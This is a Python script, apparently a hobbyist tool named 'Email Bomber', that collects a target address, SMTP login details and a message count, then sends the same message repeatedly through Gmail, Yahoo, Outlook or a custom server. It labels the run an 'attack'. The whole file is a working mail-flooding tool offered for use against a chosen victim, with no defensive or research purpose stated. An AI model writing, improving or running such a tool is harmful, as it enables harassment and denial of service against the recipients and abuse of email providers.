import smtplib
import sys
class bcolor:
	GREEN="\033[31m"
	YELLOW="\033[33m"
	BLUE="\033[34m"
def banner():
	file = open('banner.txt', 'r')
	print(' ')

	print(bcolor.BLUE+file.read())
	file.close()


    
	print(bcolor.GREEN+"\n[+]+[+]+[+]+[+]+[+]+[+] Email Bomber [+]+[+]+[+]+[+]+[+]+[+]")
	print(bcolor.YELLOW+"\n[+]+[+]+[+]+[+]+[+] By - MANJUNATHAN C [+]+[+]+[+]+[+]+[+]")

class mail_bomb:
	count=0
	def __init__(self):
		try:
			print(bcolor.GREEN+"\nSETUP STARTS.... ")
			self.target=str(input(bcolor.YELLOW+"\nENTER TARGET MAIL : "))
			self.mode=int(input(bcolor.YELLOW+"\nCHOOSE MODE : 1 OR 2 OR 3 OR 4(CUSTOM) : "))
			if(int(self.mode)>int(4) or int(self.mode)<int(1)):
				print(bcolor.GREEN+"\nError... Quiting...")
				self.exit(1)
		except Exception as e:
			print(bcolor.GREEN+f'Error {e}')
	def bomb(self):
		try:
			print(bcolor.BLUE+"\n[+]+[+]+[+]+[+] SetUP [+]+[+]+[+]+[+]")
			self.amount= None
			if self.mode== int(1):
				self.amount=int(10)
			elif self.mode== int(2):
				self.amount=int(20)
			elif self.mode== int(3):
				self.amount=int(30)
			elif self.mode== int(4):
				self.amount=int(input("\nEnter The Count : "))
			print(bcolor.GREEN+f"\nYou are Selected mode no.{self.mode} and {self.amount} Email Send")
		except Exception as e:
			print(bcolor.GREEN+f"Error {e}")

	def email(self):
		try:
			print(bcolor.BLUE+"\n[+]+[+]+[+]+[+] SetUP Emails [+]+[+]+[+]+[+]")
			self.server=str(input(bcolor.YELLOW+"\nChoose the Server\n1. Gmail\n2. Yahoo\n3. Outlook \n"))
			premade=["1","2","3"]
			default_port=True
			if self.server not in premade:
				default_port=False
				self.port=int(input(bcolor.YELLOW+"Enter The Port Number : "))
			if default_port== True:
				self.port=int(587)
			if self.server=="1":
				self.server="smtp.gmail.com"
			elif self.server=="2":
				self.server="smtp.mail.yahoo.com"
			elif self.server=="3":
				self.server="smtp.mail.outlook.com"
			self.fromAddr=str(input(bcolor.GREEN+"Enter The From Address : "))
			self.fromPwd=str(input(bcolor.GREEN+"Enter The From Address Password : "))
			self.subject=str(input(bcolor.GREEN+"Enter The Subject : "))
			self.message=str(input(bcolor.GREEN+"Enter The message : "))
			self.msg="""From: %s\nTo: %s\nSubject: %s\nMessage: %s\n"""%(self.fromAddr,self.target,self.subject,self.message)

			self.s=smtplib.SMTP(self.server,self.port)
			self.s.ehlo()
			self.s.starttls()
			self.s.ehlo()
			self.s.login(self.fromAddr,self.fromPwd)
			#self.s.connect()

		except Exception as e:
			print(bcolor.YELLOW+f'Error {e}')
	def send(self):
		try:
			self.s.sendmail(self.fromAddr,self.target,self.msg)
			self.count+=1
			print(bcolor.YELLOW+f"Bomb : {self.count}")
		except Exception as e:
			print(bcolor.GREEN+f"Error {e}")			
	def attack(self):
		print(bcolor.GREEN+"\nAttack Started...")
		for email in range(self.amount+1):
			self.send()
		self.s.close()
		print(bcolor.YELLOW+"\nAttack Finished...")
		sys.exit(0)

if __name__=="__main__":
	banner()
	bomb=mail_bomb()
	bomb.bomb()
	bomb.email()
	
	bomb.attack()

